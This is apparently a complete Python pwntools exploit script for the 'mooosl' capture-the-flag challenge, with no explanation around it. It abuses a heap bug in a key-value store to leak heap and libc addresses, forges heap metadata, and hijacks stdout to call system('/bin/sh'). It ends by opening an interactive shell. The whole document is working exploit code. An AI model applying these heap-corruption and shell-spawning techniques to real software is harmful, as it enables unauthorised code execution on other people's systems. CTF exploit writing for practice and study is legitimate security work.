#!/usr/bin/env python3
from pwn import *
import random
import string
import codecs

if len(sys.argv) == 1:
    s = process('./mooosl')
else:
    s = remote('mooosl.challenges.ooo', 23333)

def store(key_content, value_content, key_size=None, value_size=None):
    s.sendlineafter('option: ', '1')
    if key_size is None:
        key_size = len(key_content)
    s.sendlineafter('size: ', str(key_size))
    s.sendafter('content: ', key_content)
    if value_size is None:
        value_size = len(value_content)
    s.sendlineafter('size: ', str(value_size))
    s.sendafter('content: ', value_content)

def query(key_content, key_size=None, wait=True):
    s.sendlineafter('option: ', '2')
    if key_size is None:
        key_size = len(key_content)
    s.sendlineafter('size: ', str(key_size))
    if wait:
        s.recvuntil('content: ')
    s.send(key_content)

def delete(key_content, key_size=None):
    s.sendlineafter('option: ', '3')
    if key_size is None:
        key_size = len(key_content)
    s.sendlineafter('size: ', str(key_size))
    s.sendafter('content: ', key_content)

def get_hash(content):
    x = 0x7e5
    for c in content:
        x = ord(c) + x * 0x13377331
    return x & 0xfff

def find_key(h=0x7e5):
    while True:
        x = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
        if get_hash(x) == h:
            return x

store('A' * 0x30, 'A')
store('\n', 'A' * 0x210)
store(find_key(), 'A' * 0x50)
delete('\n')
query('\n', 0x400)
res = codecs.decode(s.recvline(False).split(b':')[1], 'hex')
heap_addr = u64(res[-0x8:])
log.info('heap address: %#x' % heap_addr)
libc_base = u64(res[0x10:0x18]) - 0x2ac170
log.info('libc base: %#x' % libc_base)

delete('A' * 0x30)
query(b'A' * 0x30 + p64(0x41) * 2 + p64(0) * 4 + p64(0x7e5) + p64(0) + p64(0x41) * 2)
delete('\n')

target_bin = libc_base + 0x2a9bd0
stdin = libc_base + 0x2a9180
stdout = libc_base + 0x2a9280
log.info('stdout: %#x' % stdout)
query(b'A' * 0x30 + p64(0x41) + p64(0x40) + p64(target_bin - 0x10) + p64(stdout - 0x20) + p64(0) * 4 + p64(0x40) + p64(0x41))
query('A' * 0x30)
query(b'A' * 0x30 + p64(0x41) + p64(0x40) + p64(stdout - 0x20) + p64(target_bin - 0x10) + p64(0) * 4 + p64(0x40) + p64(0x41))
query('A' * 0x30)

system = libc_base + 0x4ded0

payload = b''
payload += b'A' * 0x10
payload += b'/bin/sh\0'
payload += b'A' * 0x20
payload += p64(heap_addr + 1)
payload += b'A' * 8
payload += p64(heap_addr)
payload += b'A' * 8
payload += p64(system)
payload += b'A' * 0x3c
payload += p32((1<<32)-1)
query(payload, wait=False)

time.sleep(0.1)
s.sendline('')

s.interactive()
